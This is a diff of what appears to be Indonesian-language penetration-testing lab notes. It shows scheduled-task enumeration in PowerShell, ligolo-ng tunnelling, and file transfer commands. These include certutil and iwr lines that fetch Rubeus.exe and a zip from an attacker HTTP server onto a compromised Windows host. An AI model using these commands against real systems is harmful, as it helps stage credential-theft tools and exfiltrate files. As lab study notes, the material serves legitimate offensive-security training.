@@ -44,10 +44,8 @@ net localgroup administrator
 download ligolo agent
 [Releases · nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) 
 
-## Chisel
-
-
 # Schedule Task
+## Siapa yang menjalankan program UpdateChecker Agent (misal)?
 ```powershell
 # Versi CMD  
 schtasks /query /tn "UpdateChecker Agent" /fo list /v  
@@ -56,14 +54,18 @@ schtasks /query /tn "UpdateChecker Agent" /fo list /v
 Get-ScheduledTask -TaskName "UpdateChecker Agent"  
   
 # Versi Manual  
-PS C:\Share> $s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Principal
+$s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Principal
 ```
-
+![](Attachments/Pasted%20image%2020260704110707.png)
+## Apa yang dijalankkanya?
+```powershell
+$s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").GetTask("UpdateChecker Agent").Definition.Actions 
+```
+![](Attachments/Pasted%20image%2020260704110800.png)
 # Download
 ```powershell
-|download "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"||
+download "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
 ```
-
 # Upload
 ```powershell
 upload '/home/kali/forensic-tools/volatility3-win-exes-2.28.0/vol.exe' 'C:\Windows\Temp\vol.exe'
@@ -81,5 +83,9 @@ wget http://10.10.14.38:8088/<file>
 
 # kalau filenya besar
 certutil -urlcache -split -f http://10.10.14.38:8088/Rubeus.exe Rubeus.exe
+
+# alternative powershell
+iwr -uri http://10.10.16.84:9090/Settings_Update.zip -OutFile Settings_Update.zip
+
 ```
 
